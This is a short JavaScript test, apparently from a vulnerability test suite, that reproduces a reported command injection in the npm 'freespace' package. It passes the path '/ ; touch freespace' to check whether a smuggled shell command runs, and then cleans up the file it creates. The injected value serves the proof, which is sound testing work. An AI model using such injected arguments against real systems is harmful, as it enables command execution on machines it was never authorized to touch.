//https://hackerone.com/reports/951249
test("Command Injection in freespace", () => 
{
    const freespace = require('freespace');
	const fs = require('fs');
	const path = './freespace';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	freespace.check('/ ; touch freespace');
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
